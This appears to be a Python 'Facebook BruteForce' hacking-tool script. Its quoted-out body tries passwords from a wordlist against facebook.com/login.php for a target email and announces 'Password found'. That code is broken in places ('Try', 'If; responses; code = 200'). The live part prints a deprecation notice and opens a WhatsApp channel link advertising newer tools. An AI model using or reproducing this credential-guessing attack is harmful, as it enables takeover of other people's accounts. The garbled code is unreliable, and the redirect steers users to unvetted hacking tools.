"""
from ast import Break, Try, If
import time
import requests
import sys
if sys.version_info[0] !=3:
    print('''--------------------------------------
    REQUIRED PYTHON 3.x
    use: python3 brute2.py
--------------------------------------
            ''')
    sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    import mechanize
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent',headers['User-Agent'])]
    browser.set_handle_robots(False)
except:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('password.txt', 'r')

email= input('Enter Email/Username : ')

print ("\nTarget Email ID : ",email)

password = file.readline(20000000)
Password = ("password")
print("[*] Trying: %s"%password)
responses = browser.open(post_url)
Try
If; responses; code = 200

for form in browser.forms():
    if form.attrs['id']=='email':
        browser.form = email
    break
for forms in browser.forms():
    if forms.attrs['id']=='pass':
        browser.form = password
    break
response = browser.submit()
response_data = response.read()
if 'Find Friends' in response_data or 'Two-facthentication' in response_data or 'security code' in response_data:
   print("Password found:%s"%password)

"""
import subprocess
print('\033[1;31m Unfortunately, Fbhacker2.7 is now considered deprecated and is no longer maintained \033[1;0m')
print('\033[1;33m Shall redirect you to join our WhatsApp channel, there you shall find the latest tools \033[1;0m')
subprocess.run(['xdg-open', 'https://whatsapp.com/channel/0029Vb5f98Z90x2p6S1rhT0S'])
